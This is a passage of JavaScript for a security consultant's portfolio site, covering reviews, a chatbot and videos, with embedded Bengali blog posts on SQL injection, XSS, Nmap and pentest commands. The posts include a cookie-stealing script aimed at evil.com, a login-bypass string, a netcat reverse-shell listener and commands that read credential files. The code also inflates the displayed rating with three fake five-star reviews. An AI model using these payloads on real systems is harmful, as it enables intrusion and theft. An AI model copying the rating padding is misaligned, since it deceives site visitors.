  var query=sb.from('videos').select('*').order('created_at',{ascending:false});
  if(!isLoggedIn)query=query.eq('access','public');
  var {data:videos}=await query;
  if(!(videos&&videos.length)){el.innerHTML='<div class="no-vids">🎬 এখনো কোনো ভিডিও নেই।</div>';return;}
  el.innerHTML=videos.map(function(v){return '<div class="vid-card"><div class="vid-thumb"><iframe src="'+sanitize(v.url)+'" allowfullscreen loading="lazy"></iframe></div><div class="vid-body"><div class="vid-title">'+sanitize(v.title)+'</div><div class="vid-desc">'+sanitize(v.description)+'</div></div></div>';}).join('');
}

// ====== SETTINGS ======
async function applySettings(){
  var {data:settings}=await sb.from('settings').select('*').eq('id',1).single();
  if(!settings)return;
  var sv=document.getElementById('statusVal');
  if(!sv)return;
  if(settings.status==='available'){sv.textContent='Available';sv.style.color='var(--green)';}
  else if(settings.status==='busy'){sv.textContent='Busy';sv.style.color='var(--red)';}
  else{sv.textContent='Partially Available';sv.style.color='var(--gold)';}
  applyAnnouncement(settings.announcement);
}
function applyAnnouncement(txt){
  var bar=document.getElementById('announcementBar');
  if(txt){bar.style.display='block';document.getElementById('announcementText').textContent=txt;}
  else bar.style.display='none';
}

// ====== CONTACT ======
function submitContact(){
  var name=document.getElementById('ctName').value.trim();
  var email=document.getElementById('ctEmail').value.trim();
  var msg=document.getElementById('ctMsg').value.trim();
  if(!name||!email){alert('নাম ও email দিন।');return;}
  if(!isValidEmail(email)){alert('সঠিক email দিন।');return;}
  if(!isValidLength(name,2,50)){alert('নাম ২-৫০ অক্ষরের মধ্যে হতে হবে।');return;}
  if(msg&&msg.length>2000){alert('Message ২০০০ অক্ষরের বেশি হবে না।');return;}
  alert('✅ বার্তা পাঠানো হয়েছে! শীঘ্রই যোগাযোগ করা হবে।');
  ['ctName','ctEmail','ctBudget','ctSubject','ctMsg'].forEach(function(id){document.getElementById(id).value='';});
}

// ====== HERO CANVAS ======
function initHeroCanvas(){
  var hc=document.getElementById('hc'),ctx=hc.getContext('2d');
  var W,H,nodes=[];
  function rsz(){W=hc.offsetWidth;H=hc.offsetHeight;hc.width=W;hc.height=H;nodes=[];for(var i=0;i<40;i++)nodes.push({x:Math.random()*W,y:Math.random()*H,vx:(Math.random()-.5)*.35,vy:(Math.random()-.5)*.35,r:Math.random()*1.6+.7});}
  rsz();window.addEventListener('resize',rsz);
  var hexC='0123456789ABCDEF',streams=[];
  for(var i=0;i<18;i++){streams.push({x:Math.random()*W,y:Math.random()*H-(Math.random()*H),speed:.5+Math.random()*.7,chars:[],op:Math.random()*.14+.04});for(var j=0;j<7;j++)streams[i].chars.push(hexC[Math.floor(Math.random()*16)]);}
  var scanY=0;
  function draw(){
    ctx.clearRect(0,0,W,H);ctx.fillStyle='#04080f';ctx.fillRect(0,0,W,H);
    streams.forEach(function(s){s.y+=s.speed;if(s.y>H+90){s.y=-90;s.x=Math.random()*W;}s.chars=s.chars.map(function(){return hexC[Math.floor(Math.random()*16)];});ctx.font='11px monospace';s.chars.forEach(function(c,i){ctx.fillStyle='rgba(0,212,255,'+(s.op*(1-i/s.chars.length*.7))+')';ctx.fillText(c,s.x,s.y+i*14);});});
    nodes.forEach(function(n){n.x+=n.vx;n.y+=n.vy;if(n.x<0||n.x>W)n.vx*=-1;if(n.y<0||n.y>H)n.vy*=-1;});
    for(var i=0;i<nodes.length;i++)for(var j=i+1;j<nodes.length;j++){var dx=nodes[i].x-nodes[j].x,dy=nodes[i].y-nodes[j].y,d=Math.sqrt(dx*dx+dy*dy);if(d<120){ctx.strokeStyle='rgba(0,212,255,'+(1-d/120)*.1+')';ctx.lineWidth=.5;ctx.beginPath();ctx.moveTo(nodes[i].x,nodes[i].y);ctx.lineTo(nodes[j].x,nodes[j].y);ctx.stroke();}}
    nodes.forEach(function(n){ctx.beginPath();ctx.arc(n.x,n.y,n.r,0,Math.PI*2);ctx.fillStyle='rgba(0,212,255,.4)';ctx.fill();});
    scanY=(scanY+.5)%(H+2);ctx.strokeStyle='rgba(0,212,255,.04)';ctx.lineWidth=1.5;ctx.beginPath();ctx.moveTo(0,scanY);ctx.lineTo(W,scanY);ctx.stroke();
    requestAnimationFrame(draw);
  }
  draw();
}

// ====== CHARTS & MAP ======
function initCharts(){
  new Chart(document.getElementById('rc'),{type:'radar',data:{labels:['Pen Testing','Web Sec','Network','Dev','OSINT','Scripting'],datasets:[{data:[98,95,92,88,90,93],backgroundColor:'rgba(0,212,255,0.1)',borderColor:'rgba(0,212,255,0.8)',borderWidth:2,pointBackgroundColor:'#00d4ff',pointBorderColor:'#04080f',pointBorderWidth:2,pointRadius:4}]},options:{responsive:true,maintainAspectRatio:false,plugins:{legend:{display:false}},scales:{r:{min:60,max:100,ticks:{display:false},grid:{color:'rgba(0,212,255,0.06)'},angleLines:{color:'rgba(0,212,255,0.1)'},pointLabels:{color:'rgba(0,212,255,0.7)',font:{size:9}}}}}});
}
function initMap(){
  var mc=document.getElementById('mc'),mctx=mc.getContext('2d'),MW=mc.width,MH=mc.height;
  mctx.fillStyle='#080f1a';mctx.fillRect(0,0,MW,MH);
  mctx.strokeStyle='rgba(0,212,255,0.06)';mctx.lineWidth=1;
  for(var i=0;i<=6;i++){mctx.beginPath();mctx.moveTo(0,i*(MH/6));mctx.lineTo(MW,i*(MH/6));mctx.stroke();mctx.beginPath();mctx.moveTo(i*(MW/6),0);mctx.lineTo(i*(MW/6),MH);mctx.stroke();}
  var bd=[[.55,.05],[.65,.08],[.72,.12],[.78,.18],[.82,.28],[.84,.4],[.8,.55],[.72,.65],[.6,.7],[.48,.72],[.35,.68],[.24,.6],[.16,.48],[.12,.35],[.15,.22],[.22,.14],[.35,.08],[.48,.05],[.55,.05]];
  mctx.beginPath();bd.forEach(function(p,i){if(i===0)mctx.moveTo(p[0]*MW,p[1]*MH);else mctx.lineTo(p[0]*MW,p[1]*MH);});mctx.closePath();
  mctx.fillStyle='rgba(0,212,255,0.06)';mctx.fill();mctx.strokeStyle='rgba(0,212,255,0.2)';mctx.lineWidth=1;mctx.stroke();
  var dhaka={x:.68*MW,y:.4*MH},pingR=0;
  function anim(){
    mctx.clearRect(dhaka.x-38,dhaka.y-38,76,76);mctx.fillStyle='#080f1a';mctx.fillRect(dhaka.x-38,dhaka.y-38,76,76);
    pingR=(pingR+.6)%34;
    mctx.beginPath();mctx.arc(dhaka.x,dhaka.y,pingR,0,Math.PI*2);mctx.strokeStyle='rgba(0,212,255,'+(0.5-pingR/34*0.5)+')';mctx.lineWidth=1.5;mctx.stroke();
    [18,10].forEach(function(r){mctx.beginPath();mctx.arc(dhaka.x,dhaka.y,r,0,Math.PI*2);mctx.strokeStyle='rgba(0,212,255,'+(r===18?.08:.2)+')';mctx.lineWidth=1;mctx.stroke();});
    mctx.beginPath();mctx.arc(dhaka.x,dhaka.y,4,0,Math.PI*2);mctx.fillStyle='#00d4ff';mctx.fill();
    mctx.fillStyle='rgba(0,212,255,.9)';mctx.font='bold 10px monospace';mctx.fillText('Dhaka',dhaka.x+8,dhaka.y-7);
    mctx.fillStyle='rgba(0,212,255,.5)';mctx.font='9px monospace';mctx.fillText('Bangladesh',dhaka.x+8,dhaka.y+5);
    requestAnimationFrame(anim);
  }
  anim();
}

// ====== MISC ======
function toggleTheme(){document.body.classList.toggle('lm');}
function tFaq(i){var a=document.getElementById('fa'+i),ic=document.getElementById('fi'+i),open=a.style.display==='block';document.querySelectorAll('.faq-a').forEach(function(e){e.style.display='none';});document.querySelectorAll('.faq-ico').forEach(function(e){e.textContent='+';});if(!open){a.style.display='block';ic.textContent='−';}}
function animCount(id,target,suffix,dur){var el=document.getElementById(id),v=0,step=Math.ceil(target/(dur/30));var iv=setInterval(function(){v+=step;if(v>=target){v=target;clearInterval(iv);}el.textContent=v+(suffix||'');},30);}

// ====== SITE INIT ======
function initSite(){
  applySettings();
  renderVideoGrid();
  renderExclusive();
  renderBookingSection();
  initHeroCanvas();
  initCharts();
  initMap();
  animCount('s1',200,'+',1500);animCount('s2',150,'+',1500);
  animCount('s3',50,'+',1200);animCount('s4',99,'%',1000);
  setTimeout(function(){document.querySelectorAll('.sb-fill').forEach(function(el){el.style.width=el.getAttribute('data-w')+'%';});},800);
  initReviews();
  initCertUpload();
  setTimeout(function(){addChatMsg('bot','আসসালামু আলাইকুম! 👋 আমি <strong>Khairul Islam</strong>-এর AI assistant।<br>Booking, pricing বা যেকোনো প্রশ্ন করুন!');},700);
}

// ====== AI CHATBOT ======
var isAILoading=false;

function toggleChat(){chatOpen=!chatOpen;document.getElementById('chatWin').style.display=chatOpen?'block':'none';document.getElementById('chatNotif').style.display='none';}
function clearChat(){document.getElementById('chatMsgs').innerHTML='';chatHistory=[];setTimeout(function(){addChatMsg('bot','নতুন কথোপকথন শুরু হয়েছে। 👋');},300);}
function addChatMsg(type,html){
  var msgs=document.getElementById('chatMsgs'),d=document.createElement('div');d.className='cmsg '+type;
  var av=type==='bot'?'KI':'U';
  d.innerHTML='<div class="cmsg-row"><div class="cmsg-av">'+av+'</div><div class="cmsg-bubble">'+html+'</div></div><div class="cmsg-time">'+getTime()+'</div>';
  msgs.appendChild(d);msgs.scrollTop=msgs.scrollHeight;
}
function showAITyping(){
  var msgs=document.getElementById('chatMsgs'),t=document.createElement('div');t.className='cmsg bot';t.id='aityping';
  t.innerHTML='<div class="cmsg-row"><div class="cmsg-av">KI</div><div class="ctyping"><span></span><span></span><span></span></div></div>';
  msgs.appendChild(t);msgs.scrollTop=msgs.scrollHeight;
}
async function sendChat(){
  if(isAILoading)return;
  var inp=document.getElementById('chatIn');
  var txt=inp.value.trim().substring(0,2000);if(!txt)return;
  addChatMsg('user',txt);inp.value='';
  isAILoading=true;document.getElementById('chatSndBtn').disabled=true;showAITyping();
  try{
    // Call server-side proxy — GEMINI_KEY stays on the server
    var r=await fetch('/api/chat',{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({txt:txt,history:chatHistory.slice()})
    });
    var data=await r.json();
    var te=document.getElementById('aityping');if(te)te.remove();
    var reply='দুঃখিত। <a class="cmsg-link" href="https://t.me/Khairul_i" target="_blank">Telegram-এ যোগাযোগ করুন</a>';
    if(data.candidates&&data.candidates[0]&&data.candidates[0].content&&data.candidates[0].content.parts){
      var rawReply=data.candidates[0].content.parts[0].text;
      chatHistory.push({role:'user',parts:[{text:txt}]});
      chatHistory.push({role:'model',parts:[{text:rawReply}]});
      reply=rawReply.replace(/\*\*(.*?)\*\*/g,'<strong>$1</strong>').replace(/\*/g,'').replace(/\n/g,'<br>').replace(/(https?:\/\/[^\s<"]+)/g,'<a class="cmsg-link" href="$1" target="_blank">$1</a>');
    }
    addChatMsg('bot',reply);
  }catch(e){
    var te=document.getElementById('aityping');if(te)te.remove();
    addChatMsg('bot','সংযোগ সমস্যা। <a class="cmsg-link" href="https://t.me/Khairul_i" target="_blank">@Khairul_i</a>');
  }
  isAILoading=false;document.getElementById('chatSndBtn').disabled=false;
}

// ====== REVIEW SYSTEM ======
async function initReviews(){
  var wb=document.getElementById('writeRevBox');
  var lr=document.getElementById('loginToReview');
  var mt=document.getElementById('myRevTab');
  if(currentUser&&currentUser.role!=='guest'){
    if(wb)wb.style.display='block';if(lr)lr.style.display='none';if(mt)mt.style.display='inline-block';
  } else {
    if(wb)wb.style.display='none';if(lr)lr.style.display='block';
  }
  renderUserReviews('all');
  updateRevStats();
}

function setStar(n){
  selectedStars=n;
  document.querySelectorAll('.star-btn').forEach(function(btn,i){btn.className='star-btn'+(i<n?' on':'');});
}

function switchRevTab(tab){
  document.querySelectorAll('.rev-tab').forEach(function(el){el.className='rev-tab';});
  event.target.className='rev-tab active';
  renderUserReviews(tab);
}

async function renderUserReviews(filter){
  var el=document.getElementById('userRevsList');if(!el)return;
  var isAdmin=currentUser&&currentUser.role==='admin';
  var query=sb.from('reviews').select('*').order('created_at',{ascending:false});
  if(filter==='verified')query=query.eq('approved',true);
  else if(filter==='mine'&&currentUser)query=query.eq('email',currentUser.email);
  var {data:reviews}=await query;
  reviews=reviews||[];
  if(!reviews.length){el.innerHTML='<div style="font-size:12px;color:var(--muted);padding:10px;text-align:center;font-family:DM Mono,monospace;">কোনো review নেই।</div>';return;}
  el.innerHTML=reviews.map(function(r){
    var stars='★'.repeat(r.stars)+'☆'.repeat(5-r.stars);
    return '<div class="urev"><div class="urev-hd"><div class="urev-auth"><div class="urev-av">'+sanitize(r.name[0].toUpperCase())+'</div><div><div class="urev-name">'+sanitize(r.name)+'</div><div class="urev-date">'+sanitize(r.date)+'</div></div></div>'+(isAdmin?'<button class="urev-del" onclick="deleteReview('+r.id+')">Del</button>':'')+'</div><div class="urev-stars">'+stars+'</div><div class="urev-txt">"'+sanitize(r.text)+'"</div>'+(!r.approved?'<span class="urev-pending">// Pending approval</span>':'')+'</div>';
  }).join('');
}

async function updateRevStats(){
  var {data:approved}=await sb.from('reviews').select('stars').eq('approved',true);
  approved=approved||[];
  var total=approved.length+3;
  var avg=(approved.reduce(function(s,r){return s+r.stars;},0)+15)/total;
  avg=Math.round(avg*10)/10;
  document.getElementById('revAvgNum').textContent=avg.toFixed(1);
  document.getElementById('revAvgStars').textContent='★'.repeat(Math.round(avg))+'☆'.repeat(5-Math.round(avg));
  document.getElementById('revAvgCount').textContent=total+' reviews';
  document.getElementById('avgRating').textContent=avg.toFixed(1);
  document.getElementById('totalRevCount').textContent=total;
}

async function submitReview(){
  if(!selectedStars){showToast('wrn','⚠️','Stars দিন।');return;}
  var txt=document.getElementById('revTxt').value.trim().substring(0,1000);
  if(!txt||txt.length<10){showToast('wrn','⚠️','কমপক্ষে ১০ অক্ষর লিখুন।');return;}
  var {error}=await sb.from('reviews').insert({id:Date.now(),email:currentUser.email,name:currentUser.name||currentUser.email.split('@')[0],stars:selectedStars,text:txt,date:new Date().toLocaleDateString('bn-BD'),approved:false});
  if(error){showToast('wrn','⚠️','Review জমা ব্যর্থ হয়েছে।');return;}
  selectedStars=0;
  document.querySelectorAll('.star-btn').forEach(function(b){b.className='star-btn';});
  document.getElementById('revTxt').value='';
  showToast('ok','✅','Review জমা হয়েছে! Admin approval-এর পর দেখাবে।');
  renderUserReviews('all');
}

async function deleteReview(id){
  await sb.from('reviews').delete().eq('id',id);
  renderUserReviews('all');updateRevStats();
}

async function approveReview(id){
  await sb.from('reviews').update({approved:true}).eq('id',id);
  renderUserReviews('all');updateRevStats();
  renderAdminReviews();
}

// ====== CERTIFICATES (localStorage — file data too large for DB) ======
var certFiles=JSON.parse(localStorage.getItem('ki_certs')||'[]');
function initCertUpload(){
  var drop=document.getElementById('certDropZone');
  var inp=document.getElementById('certFileInput');
  if(!drop||!inp)return;
  drop.onclick=function(){inp.click();};
  drop.ondragover=function(e){e.preventDefault();drop.style.borderColor='var(--cyan)';};
  drop.ondragleave=function(){drop.style.borderColor='';};
  drop.ondrop=function(e){e.preventDefault();drop.style.borderColor='';handleCertFiles(e.dataTransfer.files);};
  inp.onchange=function(){handleCertFiles(inp.files);};
  renderCerts();
}
function handleCertFiles(files){
  Array.from(files).forEach(function(file){
    if(file.size>5*1024*1024){showToast('wrn','⚠️',file.name+' বড় (max 5MB)');return;}
    var reader=new FileReader();
    reader.onload=function(e){
      certFiles.push({name:file.name,data:e.target.result,type:file.type,date:new Date().toLocaleDateString('bn-BD')});
      localStorage.setItem('ki_certs',JSON.stringify(certFiles));
      renderCerts();showToast('ok','✅',file.name+' যোগ হয়েছে!');
    };
    reader.readAsDataURL(file);
  });
}
function renderCerts(){
  var el=document.getElementById('certGridList');if(!el)return;
  if(!certFiles.length){el.innerHTML='<div style="font-size:11px;color:var(--muted);font-family:DM Mono,monospace;">কোনো certificate নেই।</div>';return;}
  el.innerHTML=certFiles.map(function(c,i){
    var ic=c.type&&c.type.includes('image')?'🖼️':c.type&&c.type.includes('pdf')?'📄':'📎';
    return '<div class="ucert"><button class="ucert-del" onclick="deleteCert('+i+')">✕</button><div class="ucert-ic">'+ic+'</div><div class="ucert-nm">'+c.name.substring(0,20)+'</div><div class="ucert-dl" onclick="downloadCert('+i+')">⬇ Download</div></div>';
  }).join('');
}
function deleteCert(i){certFiles.splice(i,1);localStorage.setItem('ki_certs',JSON.stringify(certFiles));renderCerts();}
function downloadCert(i){var c=certFiles[i];var a=document.createElement('a');a.href=c.data;a.download=c.name;a.click();}

// ====== BLOG ======
var BLOGS = [
  {
    cat:'Ethical Hacking', icon:'📝', date:'15 Apr 2026', time:'8 min',
    title:'SQL Injection কী এবং কীভাবে ঠেকাবেন?',
    body:`<h3>SQL Injection কী?</h3>
<p>SQL Injection (SQLi) হলো একটি সাইবার আক্রমণ যেখানে হ্যাকার ওয়েবসাইটের input field-এ ক্ষতিকর SQL কোড প্রবেশ করিয়ে ডেটাবেজ নিয়ন্ত্রণ নেওয়ার চেষ্টা করে। এটি OWASP Top 10-এর সবচেয়ে পরিচিত আক্রমণগুলোর একটি।</p>
<h3>কীভাবে কাজ করে?</h3>
<p>ধরুন একটি লগিন ফর্মে username হিসেবে টাইপ করা হলো: <code>' OR '1'='1</code> — তাহলে SQL query হয়ে যায়:</p>
<p><code>SELECT * FROM users WHERE user='' OR '1'='1'</code></p>
<p>এই query সবসময় সত্য হয়, ফলে পাসওয়ার্ড ছাড়াই লগিন হয়ে যায়।</p>
<h3>SQL Injection-এর ধরন</h3>
<ul>
<li><strong>Classic SQLi</strong> — সরাসরি error message দেখায়</li>
<li><strong>Blind SQLi</strong> — error দেখায় না, true/false দিয়ে তথ্য বের করে</li>
<li><strong>Time-based SQLi</strong> — database-কে delay করিয়ে তথ্য বের করে</li>
<li><strong>Union-based SQLi</strong> — UNION keyword দিয়ে অন্য table-এর data বের করে</li>
</ul>
<h3>প্রতিরোধের উপায়</h3>
<ul>
<li>✅ <strong>Prepared Statements / Parameterized Queries</strong> ব্যবহার করুন</li>
<li>✅ <strong>ORM</strong> (Sequelize, Hibernate) ব্যবহার করুন</li>
<li>✅ সব user input <strong>validate ও sanitize</strong> করুন</li>
<li>✅ Database user-কে <strong>minimum permission</strong> দিন</li>
<li>✅ <strong>WAF</strong> (Web Application Firewall) ব্যবহার করুন</li>
<li>✅ Error message-এ database details <strong>প্রকাশ করবেন না</strong></li>
</ul>
<h3>Test করার Tools</h3>
<p><code>sqlmap</code> <code>Burp Suite</code> <code>Havij</code></p>
<p>মনে রাখবেন — SQLi test শুধুমাত্র নিজের বা অনুমতিপ্রাপ্ত সিস্টেমে করুন।</p>`
  },
  {
    cat:'Tools', icon:'🔧', date:'02 Apr 2026', time:'10 min',
    title:'Nmap দিয়ে Network Scanning শুরু করুন',
    body:`<h3>Nmap কী?</h3>
<p>Nmap (Network Mapper) হলো সবচেয়ে জনপ্রিয় open-source network scanning tool। এটি দিয়ে network-এর host খোঁজা, open port detect করা, OS fingerprint করা এবং service version জানা যায়।</p>
<h3>Basic Commands</h3>
<ul>
<li><code>nmap 192.168.1.1</code> — single host scan</li>
<li><code>nmap 192.168.1.0/24</code> — পুরো subnet scan</li>
<li><code>nmap -p 80,443 192.168.1.1</code> — নির্দিষ্ট port scan</li>
<li><code>nmap -p- 192.168.1.1</code> — সব 65535 port scan</li>
<li><code>nmap -sV 192.168.1.1</code> — service version detect</li>
<li><code>nmap -O 192.168.1.1</code> — OS detection</li>
<li><code>nmap -A 192.168.1.1</code> — aggressive scan (OS+version+script)</li>
</ul>
<h3>Scan Types</h3>
<ul>
<li><code>-sS</code> — SYN Stealth Scan (সবচেয়ে popular)</li>
<li><code>-sU</code> — UDP Scan</li>
<li><code>-sn</code> — Ping Scan (host discovery only)</li>
<li><code>-sC</code> — Default NSE scripts চালায়</li>
</ul>
<h3>Output Save করা</h3>
<ul>
<li><code>nmap -oN result.txt target</code> — Normal format</li>
<li><code>nmap -oX result.xml target</code> — XML format</li>
<li><code>nmap -oG result.gnmap target</code> — Grepable format</li>
</ul>
<h3>Useful NSE Scripts</h3>
<p><code>nmap --script vuln target</code> — vulnerability scan</p>
<p><code>nmap --script http-enum target</code> — web directory enum</p>
<p><code>nmap --script smb-vuln* target</code> — SMB vulnerabilities</p>
<h3>⚠️ সতর্কতা</h3>
<p>Nmap শুধুমাত্র নিজের নেটওয়ার্ক বা written permission আছে এমন নেটওয়ার্কে ব্যবহার করুন। অনুমতি ছাড়া scanning আইনত দণ্ডনীয়।</p>`
  },
  {
    cat:'CTF', icon:'🏆', date:'20 Mar 2026', time:'6 min',
    title:'CTF-এ Beginners কীভাবে শুরু করবেন',
    body:`<h3>CTF কী?</h3>
<p>CTF (Capture The Flag) হলো cybersecurity competition যেখানে বিভিন্ন security challenge সমাধান করে "flag" (একটি string) খুঁজে বের করতে হয়। এটি hacking skills develop করার সেরা উপায়।</p>
<h3>CTF-এর ধরন</h3>
<ul>
<li><strong>Jeopardy</strong> — বিভিন্ন category-র independent challenges</li>
<li><strong>Attack-Defense</strong> — নিজের সার্ভার রক্ষা করো, অন্যেরটা attack করো</li>
<li><strong>King of the Hill</strong> — একটি machine নিয়ন্ত্রণে রাখো</li>
</ul>
<h3>Common Categories</h3>
<ul>
<li>🔐 <strong>Cryptography</strong> — cipher decode, hash crack</li>
<li>🌐 <strong>Web</strong> — SQLi, XSS, SSRF, LFI</li>
<li>🔄 <strong>Reverse Engineering</strong> — binary analysis</li>
<li>💥 <strong>Pwn/Binary Exploitation</strong> — buffer overflow</li>
<li>🔍 <strong>Forensics</strong> — file analysis, steganography</li>
<li>🌐 <strong>OSINT</strong> — open source intelligence</li>
</ul>
<h3>শুরু করার Platforms</h3>
<ul>
<li><strong>PicoCTF</strong> — beginners-দের জন্য সেরা</li>
<li><strong>HackTheBox</strong> — intermediate থেকে advanced</li>
<li><strong>TryHackMe</strong> — guided learning path</li>
<li><strong>CTFtime.org</strong> — upcoming CTF events-এর calendar</li>
<li><strong>OverTheWire</strong> — Linux basics শেখার জন্য</li>
</ul>
<h3>Essential Tools</h3>
<p><code>Kali Linux</code> <code>Burp Suite</code> <code>Ghidra</code> <code>Wireshark</code> <code>CyberChef</code> <code>John the Ripper</code></p>
<h3>Tips</h3>
<ul>
<li>✅ Google করতে ভয় পাবেন না — writeup পড়ুন</li>
<li>✅ একটি category-তে focus করুন প্রথমে</li>
<li>✅ Solve না করতে পারলে hint দেখুন, শিখুন</li>
<li>✅ Team-এ খেলুন — একা থেকে দ্রুত শেখা যায়</li>
</ul>`
  },
  {
    cat:'Security', icon:'🔒', date:'05 Mar 2026', time:'12 min',
    title:'OWASP Top 10 — ২০২৬ আপডেট',
    body:`<h3>OWASP Top 10 কী?</h3>
<p>OWASP (Open Web Application Security Project) প্রতি কয়েক বছর পর web application-এর সবচেয়ে critical security risks-এর তালিকা প্রকাশ করে। ২০২৬ সালে updated তালিকা:</p>
<h3>Top 10 Vulnerabilities</h3>
<ul>
<li><strong>A01 — Broken Access Control</strong> — user অনুমতি ছাড়া অন্যের data access করতে পারে</li>
<li><strong>A02 — Cryptographic Failures</strong> — দুর্বল encryption, plaintext password storage</li>
<li><strong>A03 — Injection</strong> — SQL, NoSQL, OS, LDAP injection</li>
<li><strong>A04 — Insecure Design</strong> — design পর্যায়ে security না ভাবা</li>
<li><strong>A05 — Security Misconfiguration</strong> — default credentials, unnecessary features enabled</li>
<li><strong>A06 — Vulnerable Components</strong> — পুরনো library বা dependency ব্যবহার</li>
<li><strong>A07 — Auth Failures</strong> — weak password, no MFA, session hijacking</li>
<li><strong>A08 — Software & Data Integrity</strong> — CI/CD pipeline attack, unsigned updates</li>
<li><strong>A09 — Logging Failures</strong> — security events log না করা</li>
<li><strong>A10 — SSRF</strong> — Server-Side Request Forgery</li>
</ul>
<h3>সবচেয়ে বেশি দেখা যায়</h3>
<p>Real-world bug bounty ও pentest-এ সবচেয়ে বেশি পাওয়া যায়: <strong>Broken Access Control, Injection, Auth Failures</strong>।</p>
<h3>Developer-দের করণীয়</h3>
<ul>
<li>✅ Input validation সব জায়গায়</li>
<li>✅ HTTPS enforce করুন</li>
<li>✅ Dependencies নিয়মিত update করুন</li>
<li>✅ Least privilege principle follow করুন</li>
<li>✅ Security testing CI/CD-এ যোগ করুন</li>
</ul>`
  },
  {
    cat:'Web Security', icon:'🕷️', date:'28 Apr 2026', time:'9 min',
    title:'XSS Attack কী? কীভাবে ওয়েবসাইট সুরক্ষিত রাখবেন',
    body:`<h3>XSS কী?</h3>
<p>XSS (Cross-Site Scripting) হলো এমন একটি attack যেখানে attacker ওয়েবসাইটে malicious JavaScript inject করে অন্য user-দের browser-এ execute করায়। এটি session hijacking, credential theft এবং malware distribution-এ ব্যবহার হয়।</p>
<h3>XSS-এর ধরন</h3>
<ul>
<li><strong>Reflected XSS</strong> — URL parameter-এ script থাকে, server reflect করে</li>
<li><strong>Stored XSS</strong> — database-এ script save হয়, সবার browser-এ চলে (সবচেয়ে বিপজ্জনক)</li>
<li><strong>DOM-based XSS</strong> — client-side JavaScript দ্বারা DOM manipulate হয়</li>
</ul>
<h3>Simple Example</h3>
<p>একটি search box-এ যদি input sanitize না হয়:</p>
<p><code>&lt;script&gt;document.location='https://evil.com?c='+document.cookie&lt;/script&gt;</code></p>
<p>এই code টি victim-এর cookie চুরি করে attacker-এর server-এ পাঠাবে।</p>
<h3>প্রতিরোধ</h3>
<ul>
<li>✅ সব output <strong>HTML encode</strong> করুন (<code>&amp;lt;</code>, <code>&amp;amp;</code> ইত্যাদি)</li>
<li>✅ <strong>Content Security Policy (CSP)</strong> header set করুন</li>
<li>✅ <strong>HttpOnly ও Secure</strong> cookie flag ব্যবহার করুন</li>
<li>✅ <strong>DOMPurify</strong> বা similar library দিয়ে sanitize করুন</li>
<li>✅ <code>innerHTML</code> এর বদলে <code>textContent</code> ব্যবহার করুন</li>
<li>✅ User input কখনো directly render করবেন না</li>
</ul>
<h3>Testing Tools</h3>
<p><code>Burp Suite</code> <code>XSSer</code> <code>OWASP ZAP</code> <code>DalFox</code></p>`
  },
  {
    cat:'Bug Bounty', icon:'🐛', date:'22 Apr 2026', time:'15 min',
    title:'Bug Bounty শুরু করার সম্পূর্ণ গাইড — ২০২৬',
    body:`<h3>Bug Bounty কী?</h3>
<p>Bug Bounty হলো এমন একটি program যেখানে কোম্পানি তাদের product-এর vulnerability খুঁজে দিলে researcher-কে পুরস্কার দেয়। Google, Facebook, Microsoft সহ হাজারো কোম্পানি এই program পরিচালনা করে।</p>
<h3>শুরু করার আগে যা শিখতে হবে</h3>
<ul>
<li>🌐 Web technologies: HTML, CSS, JavaScript, HTTP/HTTPS</li>
<li>🗄️ Database basics: SQL</li>
<li>🔐 Common vulnerabilities: OWASP Top 10</li>
<li>🛠️ Tools: Burp Suite, nmap, ffuf, nuclei</li>
<li>🐧 Linux command line basics</li>
</ul>
<h3>Best Platforms</h3>
<ul>
<li><strong>HackerOne</strong> — সবচেয়ে বড় platform, বাংলাদেশি researchers active</li>
<li><strong>Bugcrowd</strong> — corporate programs বেশি</li>
<li><strong>Intigriti</strong> — European companies</li>
<li><strong>Synack</strong> — invite-only, বেশি payment</li>
<li><strong>Open Bug Bounty</strong> — শুরু করার জন্য ভালো</li>
</ul>
<h3>Step-by-Step শুরু করুন</h3>
<ul>
<li>1️⃣ TryHackMe ও PortSwigger Web Academy-তে practice করুন</li>
<li>2️⃣ HackerOne-এ free program দিয়ে শুরু করুন</li>
<li>3️⃣ Scope ভালোভাবে পড়ুন — out-of-scope report করলে ban হতে পারে</li>
<li>4️⃣ Duplicate avoid করতে আগের reports পড়ুন</li>
<li>5️⃣ Clear ও professional report লিখুন</li>
</ul>
<h3>Earnings</h3>
<p>বাংলাদেশ থেকে top researchers প্রতি মাসে $500–$10,000+ আয় করছেন। Critical vulnerability-র জন্য $50,000 পর্যন্ত bounty দেওয়া হয়।</p>
<h3>Pro Tips</h3>
<ul>
<li>✅ একটি vulnerability type-এ expert হোন</li>
<li>✅ New program launch-এ তাড়াতাড়ি রিপোর্ট করুন</li>
<li>✅ Automation শিখুন (subfinder, httpx, nuclei)</li>
<li>✅ Twitter/X-এ security researchers follow করুন</li>
</ul>`
  },
  {
    cat:'Linux', icon:'🐧', date:'10 Apr 2026', time:'11 min',
    title:'Penetration Testing-এর জন্য Linux কমান্ড — Top 30',
    body:`<h3>কেন Linux?</h3>
<p>Penetration Testing-এর জন্য Kali Linux বা Parrot OS ব্যবহার করা হয় কারণ এগুলোতে 600+ security tool pre-installed থাকে এবং Linux terminal অত্যন্ত শক্তিশালী।</p>
<h3>Network Commands</h3>
<ul>
<li><code>ifconfig / ip a</code> — network interface দেখুন</li>
<li><code>netstat -tulpn</code> — open ports দেখুন</li>
<li><code>ping target</code> — host alive কিনা চেক করুন</li>
<li><code>traceroute target</code> — route trace করুন</li>
<li><code>curl -I url</code> — HTTP header দেখুন</li>
<li><code>wget url</code> — file download করুন</li>
</ul>
<h3>File System</h3>
<ul>
<li><code>find / -name "*.conf" 2>/dev/null</code> — config file খুঁজুন</li>
<li><code>grep -r "password" /etc/</code> — password string খুঁজুন</li>
<li><code>ls -la</code> — hidden file সহ সব দেখুন</li>
<li><code>cat /etc/passwd</code> — user list দেখুন</li>
<li><code>chmod +x file.sh</code> — execute permission দিন</li>
</ul>
<h3>Process & System</h3>
<ul>
<li><code>ps aux</code> — running process দেখুন</li>
<li><code>top / htop</code> — real-time resource monitor</li>
<li><code>uname -a</code> — kernel version দেখুন</li>
<li><code>whoami</code> — current user দেখুন</li>
<li><code>sudo -l</code> — sudo permissions দেখুন</li>
<li><code>crontab -l</code> — scheduled tasks দেখুন</li>
</ul>
<h3>Useful Hacking Commands</h3>
<ul>
<li><code>nc -lvnp 4444</code> — netcat listener (reverse shell receive)</li>
<li><code>python3 -m http.server 8080</code> — quick web server</li>
<li><code>ssh user@ip</code> — SSH connect</li>
